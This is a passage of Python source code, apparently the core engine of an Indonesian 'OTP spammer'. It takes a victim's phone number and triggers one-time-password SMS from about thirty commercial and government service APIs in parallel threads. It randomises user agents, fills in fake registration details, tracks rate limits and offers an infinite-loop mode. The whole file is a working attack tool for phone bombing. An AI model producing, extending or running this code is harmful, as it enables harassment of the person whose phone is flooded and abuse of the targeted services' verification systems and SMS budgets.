#!/usr/bin/env python3
# main_engine.py - OTP Spammer Engine (LENGKAP - CTRL+C FIX)

import requests
import uuid
import random
import string
import time
import re
import json
import threading
import sys
import signal
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor, as_completed

from utils import normalize, fmt_08, get_public_ip, generate_multipart, extract_csrf, get_random_user_agent
from handlers import (
    send_tuneup_otp, send_hashmicro_otp, send_internetrakyat_otp,
    send_ultramilk_register, send_kaniva_otp, send_jembatani_otp,
    send_rcx_otp, send_sahabatteknisi_otp, send_auto2000_otp,
    send_astra_daihatsu_otp, send_royal_canin_otp, send_watsons_otp,
    send_99co_otp, send_belirumah_otp, send_fastwork_otp,
    send_hrsbre_otp, send_erafone_otp, send_beautyhaul_otp,
    send_hainaya_otp, send_minumyukkaka_otp, send_sidemang_otp,
    send_lapormasbup_otp, send_ptsp_kemenag_otp, send_planetban_otp,
    # 🔥 API TAMBAHAN
    send_uangme_otp, send_adiraku_otp, send_duniagames_otp
)
from targets import TARGETS

init(autoreset=True)

print_lock = threading.Lock()
stop_flag = False
RATE_LIMIT_KEYWORDS = ['rate limit', 'too many', 'try again', 'limit', 'exceeded', 'banned', 'blocked']

global_callback = None
global_limit_check = None

def log_target(idx, total, name, status, detail=""):
    with print_lock:
        if status == "SUCCESS":
            sym, col = "+", Fore.GREEN
        elif status == "LIMITED" or status == "BLOCKED":
            sym, col = "!", Fore.YELLOW
        elif status == "ERROR" or status == "TIMEOUT":
            sym, col = "x", Fore.RED
        else:
            sym, col = "-", Fore.RED
        print(f"{col}[{sym}]{Style.RESET_ALL} ({idx:>2}/{total}) {name:<20}: {status}" + (f" - {detail}" if detail else ""))
        
        if global_callback:
            try:
                global_callback(name, status, detail)
            except:
                pass

def process_target(api, target62, ip, idx, total):
    """Proses satu target API - SEMUA API DIPROSES"""
    global stop_flag
    if stop_flag:
        return False
        
    if global_limit_check and global_limit_check():
        return False
        
    name = api['name']
    status_text = "FAIL"
    detail = ""
    success = False

    try:
        session = requests.Session()
        session.headers.update({'User-Agent': get_random_user_agent()})

        post_type = api.get('post_type', '')
        
        # ==================== HANDLER PER POST_TYPE ====================
        
        # --- PLANET BAN ---
        if name == 'PlanetBan':
            number_08 = api['number_fmt'](target62)
            resp = send_planetban_otp(number_08)
            if resp is not None:
                if resp.status_code == 200:
                    status_text = "SUCCESS"
                    detail = "OTP sent"
                    success = True
                elif resp.status_code == 429:
                    status_text = "LIMITED"
                    detail = "Rate limit"
                else:
                    detail = f"({resp.status_code})"
            else:
                status_text = "ERROR"
                detail = "No response"
            log_target(idx, total, name, status_text, detail)
            return success

        # --- TUNEUP ---
        if post_type == 'tuneup':
            number_for_tuneup = api['number_fmt'](target62)
            resp = send_tuneup_otp(number_for_tuneup)
            if resp is not None:
                text = resp.text.lower()
                keywords = api.get('success_on', [])
                is_success = any(kw in text for kw in keywords)
                is_rate_limit = (resp.status_code == 429) or any(kw in text for kw in RATE_LIMIT_KEYWORDS)
                if is_success:
                    status_text = "SUCCESS"
                    detail = "OTP sent"
                    success = True
                elif is_rate_limit:
                    status_text = "LIMITED"
                    detail = text[:60]
                else:
                    detail = f"({resp.status_code}) {text[:60]}"
            else:
                status_text = "ERROR"
                detail = "No response"

        # --- HASHMICRO ---
        elif post_type == 'hashmicro':
            number = api['number_fmt'](target62)
            final_headers = dict(api.get('headers', {}))
            final_headers['User-Agent'] = get_random_user_agent()
            form_data = send_hashmicro_otp(number)
            if form_data is not None:
                payload_str = '&'.join([f"{k}={requests.utils.quote(str(v))}" for k, v in form_data.items()])
                resp = session.post(api['url'], headers=final_headers, data=payload_str, timeout=15)
                text = resp.text.lower()
                keywords = api.get('success_on', [])
                is_success = any(kw in text for kw in keywords) or resp.status_code == 200
                is_rate_limit = (resp.status_code == 429) or any(kw in text for kw in RATE_LIMIT_KEYWORDS)
                if is_success:
                    status_text = "SUCCESS"
                    detail = ""
                    success = True
                elif is_rate_limit:
                    status_text = "LIMITED"
                    detail = text[:60]
                else:
                    detail = f"({resp.status_code}) {text[:60]}"
            else:
                status_text = "ERROR"
                detail = "HashMicro payload failed"

        # --- INTERNET RAKYAT ---
        elif post_type == 'internetrakyat':
            phone_08 = api['number_fmt'](target62)
            resp = send_internetrakyat_otp(phone_08)
            if resp is not None:
                try:
                    data = resp.json()
                    if data.get("statusCode") == 200 and data.get("message") == "OTP terkirim":
                        status_text = "SUCCESS"
                        detail = "OTP sent"
                        success = True
                    else:
                        detail = data.get("message", "")[:60]
                except:
                    detail = resp.text[:60]
            else:
                status_text = "ERROR"
                detail = "No response"

        # --- ULTRAMILK ---
        elif post_type == 'ultramilk':
            resp = send_ultramilk_register(target62)
            if resp is not None:
                text = resp.text.lower()
                keywords = api.get('success_on', [])
                is_success = any(kw in text for kw in keywords) or resp.status_code == 200
                is_rate_limit = (resp.status_code == 429) or any(kw in text for kw in RATE_LIMIT_KEYWORDS)
                if is_success:
                    status_text = "SUCCESS"
                    detail = "Registration OTP"
                    success = True
                elif is_rate_limit:
                    status_text = "LIMITED"
                    detail = text[:60]
                else:
                    detail = f"({resp.status_code}) {text[:60]}"
            else:
                status_text = "ERROR"
                detail = "No response"

        # --- KANIVA ---
        elif post_type == 'kaniva':
            number_08 = api['number_fmt'](target62)
            rand_name = 'User' + ''.join(random.choices(string.ascii_lowercase+string.digits, k=4))
            resp = send_kaniva_otp(number_08, rand_name)
            if resp is not None:
                text = resp.text.lower()
                keywords = api.get('success_on', [])
                is_success = any(kw in text for kw in keywords) or resp.status_code == 200
                is_rate_limit = (resp.status_code == 429) or any(kw in text for kw in RATE_LIMIT_KEYWORDS)
                if is_success:
                    status_text = "SUCCESS"
                    detail = "OTP sent"
                    success = True
                elif is_rate_limit:
                    status_text = "LIMITED"
                    detail = text[:60]
                else:
                    detail = f"({resp.status_code}) {text[:60]}"
            else:
                status_text = "ERROR"
                detail = "Token CSRF not found"

        # --- JEMBATANI ---
        elif post_type == 'jembatani':
            number_08 = api['number_fmt'](target62)
            rand_name = 'User' + ''.join(random.choices(string.ascii_lowercase+string.digits, k=4))
            jemb_pass = "Test@" + ''.join(random.choices(string.ascii_letters + string.digits, k=5)) + "#1"
            resp = send_jembatani_otp(number_08, rand_name, jemb_pass)
            if resp is not None:
                text = resp.text.lower()
                keywords = api.get('success_on', [])
                is_success = any(kw in text for kw in keywords) or resp.status_code == 200
                is_rate_limit = (resp.status_code == 429) or any(kw in text for kw in RATE_LIMIT_KEYWORDS)
                if is_success:
                    status_text = "SUCCESS"
                    detail = "OTP sent"
                    success = True
                elif is_rate_limit:
                    status_text = "LIMITED"
                    detail = text[:60]
                else:
                    detail = f"({resp.status_code}) {text[:60]}"
            else:
                status_text = "ERROR"
                detail = "Request failed"

        # --- RCX ---
        elif post_type == 'rcx':
            number_08 = api['number_fmt'](target62)
            rand_name = 'User' + ''.join(random.choices(string.ascii_lowercase+string.digits, k=4))
            rand_email = f'user{random.randint(1000,9999)}@mailnesia.com'
            resp = send_rcx_otp(number_08, rand_name, rand_email)
            if resp is not None:
                text = resp.text.lower() if resp.text else ''
                keywords = api.get('success_on', [])
                is_success = (resp.status_code == 302 and any(kw in resp.headers.get('location','').lower() for kw in ['challenge'])) or any(kw in text for kw in keywords)
                is_rate_limit = (resp.status_code == 429) or any(kw in text for kw in RATE_LIMIT_KEYWORDS)
                if is_success:
                    status_text = "SUCCESS"
                    detail = "OTP triggered"
                    success = True
                elif is_rate_limit:
                    status_text = "LIMITED"
                    detail = text[:60] if text else "limited"
                else:
                    detail = f"({resp.status_code}) {text[:60] if text else 'no body'}"
            else:
                status_text = "ERROR"
                detail = "Request failed"

        # --- SAHABAT TEKNISI ---
        elif post_type == 'sahabatteknisi':
            number_08 = api['number_fmt'](target62)
            resp = send_sahabatteknisi_otp(number_08)
            if resp is not None:
                text = resp.text.lower()
                keywords = api.get('success_on', [])
                is_success = any(kw in text for kw in keywords) or resp.status_code == 200
                is_rate_limit = (resp.status_code == 429) or any(kw in text for kw in RATE_LIMIT_KEYWORDS)
                if is_success:
                    status_text = "SUCCESS"
                    detail = "OTP sent"
                    success = True
                elif is_rate_limit:
                    status_text = "LIMITED"
                    detail = text[:60]
                else:
                    detail = f"({resp.status_code}) {text[:60]}"
            else:
                status_text = "ERROR"
                detail = "Request failed"

        # --- AUTO2000 ---
        elif post_type == 'auto2000':
            number_08 = api['number_fmt'](target62)
            resp = send_auto2000_otp(number_08)
            if resp is not None:
                if resp.status_code == 200:
                    try:
                        data = resp.json()
                        ack = data.get("acknowledge", 0)
                        msg = data.get("message", "")
                        if ack == 1 and msg == "success":
                            status_text = "SUCCESS"
                            detail = "OTP sent"
                            success = True
                        elif "resend in" in msg.lower():
                            match = re.search(r'resend in (\d+) s', msg)
                            sec = match.group(1) if match else "?"
                            detail = f"Limit: retry after {sec}s"
                            status_text = "LIMITED"
                        else:
                            detail = f"message: {msg[:60]}"
                    except json.JSONDecodeError:
                        detail = resp.text[:60]
                elif resp.status_code == 403:
                    status_text = "BLOCKED"
                    detail = "Cloudflare 403"
                else:
                    detail = f"({resp.status_code}) {resp.text[:60]}"
            else:
                status_text = "ERROR"
                detail = "Failed after retries"

        # --- ASTRA DAIHATSU ---
        elif post_type == 'astra_daihatsu':
            number_62 = api['number_fmt'](target62)
            resp = send_astra_daihatsu_otp(number_62)
            if resp is not None and resp.status_code == 200:
                try:
                    data = resp.json()
                    msg = data.get("message", "")
                    ack = data.get("acknowledge", 0)
                    if ack == 1 and "OTP Success" in msg:
                        if "still valid" not in msg.lower():
                            status_text = "SUCCESS"
                            detail = "OTP sent"
                            success = True
                        else:
                            status_text = "LIMITED"
                            detail = "OTP still valid"
                    else:
                        detail = msg[:60]
                except:
                    detail = resp.text[:60]
            elif resp is not None:
                detail = f"({resp.status_code}) {resp.text[:60]}"
            else:
                status_text = "ERROR"
                detail = "No response"

        # --- ROYAL CANIN ---
        elif post_type == 'royal_canin':
            phone_plus = api['number_fmt'](target62)
            resp = send_royal_canin_otp(phone_plus)
            if resp is not None and resp.status_code == 200:
                try:
                    data = resp.json()
                    result = data.get("result", {})
                    if result.get("ReturnStatus") == 1:
                        status_text = "SUCCESS"
                        detail = "OTP sent"
                        success = True
                    else:
                        detail = result.get("ReturnMessage", "")[:60]
                except:
                    detail = resp.text[:60]
            elif resp is not None:
                detail = f"({resp.status_code}) {resp.text[:60]}"
            else:
                status_text = "ERROR"
                detail = "No response"

        # --- WATSONS ---
        elif post_type == 'watsons':
            phone_no_code = api['number_fmt'](target62)
            resp = send_watsons_otp(phone_no_code)
            if resp is not None and resp.status_code == 200:
                try:
                    data = resp.json()
                    if "token" in data:
                        status_text = "SUCCESS"
                        detail = "OTP sent"
                        success = True
                    else:
                        detail = f"Response: {str(data)[:60]}"
                except:
                    detail = resp.text[:60]
            elif resp is not None:
                detail = f"({resp.status_code}) {resp.text[:60]}"
                if resp.status_code == 429:
                    status_text = "LIMITED"
            else:
                status_text = "ERROR"
                detail = "No response"

        # --- 99.CO ---
        elif post_type == '99co':
            phone_plus = api['number_fmt'](target62)
            resp = send_99co_otp(phone_plus)
            if resp is not None:
                text = resp.text.lower()
                keywords = api.get('success_on', [])
                is_success = any(kw in text for kw in keywords) or resp.status_code == 200
                is_rate_limit = (resp.status_code == 429) or any(kw in text for kw in RATE_LIMIT_KEYWORDS)
                if is_success:
                    status_text = "SUCCESS"
                    detail = "OTP sent"
                    success = True
                elif is_rate_limit:
                    status_text = "LIMITED"
                    detail = text[:60]
                else:
                    detail = f"({resp.status_code}) {text[:60]}"
            else:
                status_text = "ERROR"
                detail = "No response"

        # --- BELI RUMAH ---
        elif post_type == 'belirumahco':
            phone_plus = api['number_fmt'](target62)
            resp = send_belirumah_otp(phone_plus)
            if resp is not None:
                text = resp.text.lower()
                keywords = api.get('success_on', [])
                is_success = any(kw in text for kw in keywords) or resp.status_code == 200
                is_rate_limit = (resp.status_code == 429) or any(kw in text for kw in RATE_LIMIT_KEYWORDS)
                if is_success:
                    status_text = "SUCCESS"
                    detail = "OTP sent"
                    success = True
                elif is_rate_limit:
                    status_text = "LIMITED"
                    detail = text[:60]
                else:
                    detail = f"({resp.status_code}) {text[:60]}"
            else:
                status_text = "ERROR"
                detail = "No response"

        # --- FASTWORK ---
        elif post_type == 'fastworkid':
            number_08 = api['number_fmt'](target62)
            resp = send_fastwork_otp(number_08)
            if resp is not None:
                text = resp.text.lower()
                keywords = api.get('success_on', [])
                is_success = any(kw in text for kw in keywords) or resp.status_code == 200
                is_rate_limit = (resp.status_code == 429) or any(kw in text for kw in RATE_LIMIT_KEYWORDS)
                if is_success:
                    status_text = "SUCCESS"
                    detail = "OTP sent"
                    success = True
                elif is_rate_limit:
                    status_text = "LIMITED"
                    detail = text[:60]
                else:
                    detail = f"({resp.status_code}) {text[:60]}"
            else:
                status_text = "ERROR"
                detail = "No response"

        # --- HRSBRE ---
        elif post_type == 'hrsbre':
            number_08 = api['number_fmt'](target62)
            status_code, resp_text = send_hrsbre_otp(number_08)
            if status_code:
                text = resp_text.lower() if resp_text else ''
                keywords = api.get('success_on', [])
                is_success = any(kw in text for kw in keywords)
                is_rate_limit = (status_code == 429) or any(kw in text for kw in RATE_LIMIT_KEYWORDS)
                if is_success:
                    status_text = "SUCCESS"
                    detail = "OTP sent"
                    success = True
                elif is_rate_limit:
                    status_text = "LIMITED"
                    detail = text[:60]
                else:
                    detail = f"({status_code}) {text[:60]}"
            else:
                status_text = "ERROR"
                detail = "Network error"

        # --- ERAFONE ---
        elif post_type == 'erafone':
            number_normal = api['number_fmt'](target62)
            result = send_erafone_otp(number_normal)
            if isinstance(result, tuple) and len(result) == 2:
                code, resp = result
                if code == 200:
                    if isinstance(resp, dict) and resp.get("message") == "Success Request OTP":
                        status_text = "SUCCESS"
                        detail = "OTP sent"
                        success = True
                    else:
                        detail = f"({code}) {resp if isinstance(resp, str) else ''}".strip()[:60]
                else:
                    detail = f"({code}) {str(resp)[:60]}"
                    if code == 429:
                        status_text = "LIMITED"
            else:
                status_text = "ERROR"
                detail = "Bad response format"

        # --- BEAUTYHAUL ---
        elif post_type == 'beautyhaul':
            local_number = api['number_fmt'](target62)
            resp = send_beautyhaul_otp(local_number)
            if resp is not None:
                text = resp.text.lower()
                keywords = api.get('success_on', [])
                is_success = any(kw in text for kw in keywords) or resp.status_code == 200
                is_rate_limit = (resp.status_code == 429) or any(kw in text for kw in RATE_LIMIT_KEYWORDS)
                if is_success:
                    status_text = "SUCCESS"
                    detail = "OTP sent"
                    success = True
                elif is_rate_limit:
                    status_text = "LIMITED"
                    detail = text[:60]
                else:
                    detail = f"({resp.status_code}) {text[:60]}"
            else:
                status_text = "ERROR"
                detail = "No response"

        # --- HAINAYA ---
        elif post_type == 'hainaya':
            phone_for_api = api['number_fmt'](target62)
            resp = send_hainaya_otp(phone_for_api)
            if resp is not None:
                status_code = resp.status_code
                try:
                    data = resp.json()
                    text = resp.text.lower()
                except:
                    data = {}
                    text = resp.text.lower()
                if status_code == 201:
                    if data.get('tenant_id'):
                        status_text = "SUCCESS"
                        detail = "OTP sent (register)"
                        success = True
                    else:
                        detail = "201 no tenant_id"
                elif status_code == 200:
                    if data.get('session_id') or data.get('message'):
                        status_text = "SUCCESS"
                        detail = "OTP sent (login)"
                        success = True
                    else:
                        detail = f"200: {str(data)[:60]}"
                elif status_code == 409:
                    status_text = "SUCCESS"
                    detail = "OTP sent (already registered)"
                    success = True
                elif status_code == 429:
                    status_text = "LIMITED"
                    detail = "Rate limit"
                else:
                    keywords = api.get('success_on', [])
                    is_success = any(kw in text for kw in keywords)
                    if is_success:
                        status_text = "SUCCESS"
                        detail = "OTP sent"
                        success = True
                    else:
                        detail = f"({status_code}) {str(data)[:60] if data else text[:60]}"
            else:
                status_text = "ERROR"
                detail = "No response"

        # --- MINUMYUKKAKA ---
        elif post_type == 'minumyukkaka':
            phone_08 = api['number_fmt'](target62)
            resp = send_minumyukkaka_otp(phone_08)
            if resp is not None:
                status_code = resp.status_code
                try:
                    data = resp.json()
                    text = resp.text.lower()
                except:
                    data = {}
                    text = resp.text.lower()
                if status_code == 200:
                    if data.get('IsSuccess') == True:
                        status_text = "SUCCESS"
                        detail = "OTP sent"
                        success = True
                    else:
                        error_msg = data.get('Message', 'Unknown error')
                        if 'rate' in error_msg.lower() or 'limit' in error_msg.lower():
                            status_text = "LIMITED"
                            detail = error_msg[:60]
                        else:
                            detail = f"Error: {error_msg[:60]}"
                elif status_code == 429:
                    status_text = "LIMITED"
                    detail = "Rate limit"
                else:
                    keywords = api.get('success_on', [])
                    is_success = any(kw in text for kw in keywords)
                    if is_success:
                        status_text = "SUCCESS"
                        detail = "OTP sent"
                        success = True
                    else:
                        detail = f"({status_code}) {str(data)[:60] if data else text[:60]}"
            else:
                status_text = "ERROR"
                detail = "No response"

        # --- SIDEMANG ---
        elif post_type == 'sidemang':
            phone_08 = api['number_fmt'](target62)
            resp = send_sidemang_otp(phone_08)
            if resp is not None:
                status_code = resp.status_code
                try:
                    data = resp.json()
                    text = resp.text.lower()
                except:
                    data = {}
                    text = resp.text.lower()
                if status_code == 200:
                    if data.get('otpDispatched') == True:
                        status_text = "SUCCESS"
                        detail = "OTP sent"
                        success = True
                    else:
                        error_msg = data.get('message', 'Unknown error')
                        detail = f"Error: {error_msg[:60]}"
                elif status_code == 429:
                    status_text = "LIMITED"
                    detail = "Rate limit"
                elif status_code == 400:
                    error_msg = data.get('message', 'Bad Request')
                    detail = f"Error: {error_msg[:60]}"
                else:
                    keywords = api.get('success_on', [])
                    is_success = any(kw in text for kw in keywords)
                    if is_success:
                        status_text = "SUCCESS"
                        detail = "OTP sent"
                        success = True
                    else:
                        detail = f"({status_code}) {str(data)[:60] if data else text[:60]}"
            else:
                status_text = "ERROR"
                detail = "No response"

        # --- LAPORMASBUP ---
        elif post_type == 'lapormasbup':
            phone_08 = api['number_fmt'](target62)
            resp, is_resend = send_lapormasbup_otp(phone_08)
            if resp is not None:
                status_code = resp.status_code
                try:
                    data = resp.json()
                    text = resp.text.lower()
                except:
                    data = {}
                    text = resp.text.lower()
                if status_code == 200:
                    if 'user' in data and 'warga_id' in data['user']:
                        status_text = "SUCCESS"
                        detail = "OTP sent" + (" (resend)" if is_resend else " (register)")
                        success = True
                    elif data.get('message') and 'berhasil' in data.get('message', '').lower():
                        status_text = "SUCCESS"
                        detail = "OTP sent" + (" (resend)" if is_resend else " (register)")
                        success = True
                    else:
                        detail = f"Response: {str(data)[:60]}"
                elif status_code == 400:
                    error_msg = data.get('error', data.get('message', 'Bad Request'))
                    if 'verifikasi' in error_msg.lower():
                        status_text = "SUCCESS"
                        detail = "OTP sent (auto-resend)"
                        success = True
                    else:
                        detail = f"Error: {error_msg[:60]}"
                elif status_code == 429:
                    status_text = "LIMITED"
                    detail = "Rate limit"
                else:
                    keywords = api.get('success_on', [])
                    is_success = any(kw in text for kw in keywords)
                    if is_success:
                        status_text = "SUCCESS"
                        detail = "OTP sent" + (" (resend)" if is_resend else " (register)")
                        success = True
                    else:
                        detail = f"({status_code}) {str(data)[:60] if data else text[:60]}"
            else:
                status_text = "ERROR"
                detail = "No response"

        # --- PTSP KEMENAG ---
        elif post_type == 'ptspkemenag':
            phone_08 = api['number_fmt'](target62)
            resp = send_ptsp_kemenag_otp(phone_08)
            if resp is not None:
                status_code = resp.status_code
                try:
                    data = resp.json()
                    text = resp.text.lower()
                except:
                    data = {}
                    text = resp.text.lower()
                if status_code == 200 or status_code == 201:
                    if data.get('success') == True:
                        status_text = "SUCCESS"
                        detail = "OTP sent"
                        success = True
                    elif 'user' in data or 'data' in data:
                        status_text = "SUCCESS"
                        detail = "OTP sent"
                        success = True
                    else:
                        detail = f"Response: {str(data)[:60]}"
                elif status_code == 400:
                    error_msg = data.get('message', 'Bad Request')
                    detail = f"Error: {error_msg[:60]}"
                elif status_code == 409:
                    status_text = "LIMITED"
                    detail = "Already registered"
                elif status_code == 429:
                    status_text = "LIMITED"
                    detail = "Rate limit"
                else:
                    keywords = api.get('success_on', [])
                    is_success = any(kw in text for kw in keywords)
                    if is_success:
                        status_text = "SUCCESS"
                        detail = "OTP sent"
                        success = True
                    else:
                        detail = f"({status_code}) {str(data)[:60] if data else text[:60]}"
            else:
                status_text = "ERROR"
                detail = "No response"

        # ==================== UANGME ====================
        elif post_type == 'uangme':
            number = api['number_fmt'](target62)
            try:
                resp = send_uangme_otp(number)
            except Exception as e:
                log_target(idx, total, name, "ERROR", str(e)[:30])
                return False
            
            if resp is None:
                status_text, detail = "ERROR", "No response"
            elif resp.status_code == 200:
                try:
                    data = resp.json()
                    if data.get('code') == '200':
                        status_text, detail, success = "SUCCESS", "OTP sent", True
                    else:
                        status_text, detail = "FAIL", data.get('message', '')
                except:
                    status_text, detail, success = "SUCCESS", "OTP sent", True
            elif resp.status_code == 429:
                status_text, detail = "LIMITED", "Rate limit"
            else:
                status_text, detail = "FAIL", f"({resp.status_code})"
            log_target(idx, total, name, status_text, detail)
            return success

        # ==================== ADIRAKU ====================
        elif post_type == 'adiraku':
            number = api['number_fmt'](target62)
            try:
                resp = send_adiraku_otp(number)
            except Exception as e:
                log_target(idx, total, name, "ERROR", str(e)[:30])
                return False
            
            if resp is None:
                status_text, detail = "ERROR", "No response"
            elif resp.status_code == 200:
                try:
                    data = resp.json()
                    if data.get('message') == 'success':
                        status_text, detail, success = "SUCCESS", "OTP sent", True
                    else:
                        status_text, detail = "FAIL", data.get('message', '')
                except:
                    status_text, detail, success = "SUCCESS", "OTP sent", True
            elif resp.status_code == 429:
                status_text, detail = "LIMITED", "Rate limit"
            else:
                status_text, detail = "FAIL", f"({resp.status_code})"
            log_target(idx, total, name, status_text, detail)
            return success

        # ==================== DUNIA GAMES ====================
        elif post_type == 'duniagames':
            number = api['number_fmt'](target62)
            try:
                resp = send_duniagames_otp(number)
            except Exception as e:
                log_target(idx, total, name, "ERROR", str(e)[:30])
                return False
            
            if resp is None:
                status_text, detail = "ERROR", "No response"
            elif resp.status_code in [200, 201]:
                try:
                    data = resp.json()
                    if data.get('success') == True:
                        status_text, detail, success = "SUCCESS", "OTP sent", True
                    else:
                        status_text, detail = "SUCCESS", "OTP sent", True
                        success = True
                except:
                    status_text, detail, success = "SUCCESS", "OTP sent", True
            elif resp.status_code == 429:
                status_text, detail = "LIMITED", "Rate limit"
            else:
                status_text, detail = "FAIL", f"({resp.status_code})"
            log_target(idx, total, name, status_text, detail)
            return success

        # ==================== GENERIC HANDLER (UNTUK SEMUA API) ====================
        else:
            # 🔥 AMBIL DATA DARI API - TANPA SKIP
            url = api.get('url', '')
            referer = api.get('referer', '').replace('{raw}', target62)
            headers = api.get('headers', {}).copy()
            payload_template = api.get('payload', '')
            number = api['number_fmt'](target62)
            method = api.get('method', 'POST').upper()
            
            # 🔥 SET HEADER
            for hk, hv in headers.items():
                if isinstance(hv, str):
                    hv = hv.replace('{raw}', target62).replace('{number}', str(number))
                headers[hk] = hv
            headers['User-Agent'] = get_random_user_agent()
            headers['Accept'] = 'application/json, text/plain, */*'
            headers['Accept-Language'] = 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
            
            # 🔥 AMBIL CSRF TOKEN JIKA PERLU
            if referer:
                try:
                    session.get(referer, timeout=8)
                except:
                    pass
            
            resp = None
            
            try:
                if payload_template:
                    # 🔥 GENERATE PAYLOAD
                    payload_str = payload_template.replace('{number}', str(number))\
                        .replace('{rand}', str(uuid.uuid4()))\
                        .replace('{ip}', ip)\
                        .replace('{raw}', target62)\
                        .replace('{name}', 'User'+str(random.randint(100,999)))\
                        .replace('{email}', f'user{random.randint(1000,9999)}@mailnesia.com')\
                        .replace('{pw}', 'Pass'+''.join(random.choices(string.ascii_letters+string.digits, k=6))+'@1')\
                        .replace('{uuid_val}', str(uuid.uuid4()))\
                        .replace('{device_id}', str(uuid.uuid4()))\
                        .replace('{recaptcha}', '')
                    
                    if method == 'GET':
                        resp = session.get(url, headers=headers, timeout=15)
                    else:
                        resp = session.post(url, headers=headers, data=payload_str, timeout=15)
                else:
                    # 🔥 TANPA PAYLOAD
                    if method == 'GET':
                        resp = session.get(url, headers=headers, timeout=15)
                    else:
                        resp = session.post(url, headers=headers, timeout=15)
                    
            except Exception as e:
                resp = None

            # 🔥 PROSES RESPONSE
            if resp is not None:
                status_code = resp.status_code
                text = resp.text.lower() if resp.text else ""
                keywords = api.get('success_on', [])
                
                # Cek sukses berdasarkan status code
                if status_code in [200, 201, 202]:
                    if keywords:
                        if any(kw in text for kw in keywords):
                            status_text, detail, success = "SUCCESS", "OTP sent", True
                        else:
                            status_text, detail = "FAIL", f"({status_code}) no keyword"
                    else:
                        status_text, detail, success = "SUCCESS", "OTP sent", True
                elif status_code in [302, 303]:
                    status_text, detail, success = "SUCCESS", "OTP triggered", True
                elif status_code == 429:
                    status_text, detail = "LIMITED", "Rate limit"
                elif status_code == 403:
                    status_text, detail = "BLOCKED", "Forbidden"
                elif status_code == 404:
                    status_text, detail = "FAIL", "API not found"
                elif status_code >= 500:
                    status_text, detail = "FAIL", f"Server error ({status_code})"
                else:
                    if keywords and any(kw in text for kw in keywords):
                        status_text, detail, success = "SUCCESS", "OTP sent", True
                    else:
                        status_text, detail = "FAIL", f"({status_code})"
            else:
                status_text, detail = "ERROR", "No response"
            
            log_target(idx, total, name, status_text, detail)
            return success

    except requests.exceptions.Timeout:
        log_target(idx, total, name, "TIMEOUT", "")
    except requests.exceptions.ConnectionError:
        log_target(idx, total, name, "CONN_ERR", "")
    except requests.exceptions.SSLError:
        log_target(idx, total, name, "SSL_ERR", "")
    except requests.exceptions.RequestException as e:
        log_target(idx, total, name, "REQUEST_ERR", str(e)[:30])
    except Exception as e:
        log_target(idx, total, name, "ERROR", str(e)[:40])

    return success

# ==================== RUN FUNCTIONS ====================

def run_single_round(threads=5, target=None, callback=None, limit_check=None, limit_use=None):
    """Jalankan Single Round - mengurangi 1 limit per sesi"""
    global stop_flag, global_callback, global_limit_check
    stop_flag = False
    global_callback = callback
    global_limit_check = limit_check
    
    total_apis = len(TARGETS)
    print()
    print(f"{Fore.CYAN}Memulai spam menggunakan {Fore.WHITE}{total_apis}{Fore.CYAN} API{Style.RESET_ALL}")
    print()
    
    if target is None:
        target = input(f"{Fore.WHITE}Nomor target (08xx / +62xx): {Style.RESET_ALL}").strip()
    
    if not target:
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Nomor tidak boleh kosong!")
        return False
    
    target62 = normalize(target)
    if not target62:
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Format nomor tidak valid. Gunakan format 08xx atau +62xx")
        return False
    
    ip = get_public_ip()
    success_count = 0
    total_targets = len(TARGETS)
    
    # 🔥 GUNakan 1 limit SEBELUM menjalankan spam
    if limit_use:
        used, msg = limit_use()
        if not used:
            print(f"{Fore.RED}[LIMIT]{Style.RESET_ALL} {msg}")
            return False
        print(f"{Fore.GREEN}[LIMIT]{Style.RESET_ALL} {msg}")
    
    # 🔥 TANPA SIGNAL HANDLER - biarkan KeyboardInterrupt naik
    # 🔥 TAPI KITA TANGKAP DI TRY-EXCEPT
    
    try:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for idx, api in enumerate(TARGETS, 1):
                if stop_flag:
                    break
                if limit_check and limit_check():
                    print(f"{Fore.YELLOW}[LIMIT]{Style.RESET_ALL} Limit habis! Berhenti...")
                    break
                futures.append(executor.submit(process_target, api, target62, ip, idx, total_targets))
            
            for future in as_completed(futures):
                if stop_flag:
                    for f in futures:
                        f.cancel()
                    break
                try:
                    if future.result():
                        success_count += 1
                except:
                    pass
                    
    except KeyboardInterrupt:
        # 🔥 TANGKAP CTRL+C - SET STOP FLAG
        stop_flag = True
        print()
        print(f"{Fore.YELLOW}[WARNING]{Style.RESET_ALL} Menghentikan proses...")
        # 🔥 RE-RAISE AGAR run_with_ui TAHU
        raise
        
    except Exception as e:
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} {e}")
    
    finally:
        global_callback = None
        global_limit_check = None
    
    if stop_flag:
        print(f"{Fore.YELLOW}[WARNING]{Style.RESET_ALL} Proses dihentikan. Total sukses: {success_count}/{total_targets}")
    else:
        print(f"{Fore.CYAN}[INFO]{Style.RESET_ALL} Selesai. Sukses: {success_count}/{total_targets}")
    
    return success_count > 0

def run_infinite_loop(threads=5, target=None, callback=None, limit_check=None, limit_use=None):
    """Jalankan Infinite Loop - mengurangi 1 limit per sesi"""
    global stop_flag, global_callback, global_limit_check
    stop_flag = False
    global_callback = callback
    global_limit_check = limit_check
    
    total_apis = len(TARGETS)
    print()
    print(f"{Fore.CYAN}Memulai spam menggunakan {Fore.WHITE}{total_apis}{Fore.CYAN} API{Style.RESET_ALL}")
    print()
    
    print(f"{Fore.CYAN}[INFO]{Style.RESET_ALL} Menjalankan Infinite Loop (delay 60 detik)...")
    
    if target is None:
        target = input(f"{Fore.WHITE}Nomor target (08xx / +62xx): {Style.RESET_ALL}").strip()
    
    if not target:
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Nomor tidak boleh kosong!")
        return False
    
    target62 = normalize(target)
    if not target62:
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Format nomor tidak valid. Gunakan format 08xx atau +62xx")
        return False
    
    ip = get_public_ip()
    total_success = 0
    total_fail = 0
    round_count = 0
    
    # 🔥 GUNakan 1 limit SEBELUM menjalankan spam
    if limit_use:
        used, msg = limit_use()
        if not used:
            print(f"{Fore.RED}[LIMIT]{Style.RESET_ALL} {msg}")
            return False
        print(f"{Fore.GREEN}[LIMIT]{Style.RESET_ALL} {msg}")
    
    # 🔥 TANPA SIGNAL HANDLER - biarkan KeyboardInterrupt naik
    
    try:
        while not stop_flag:
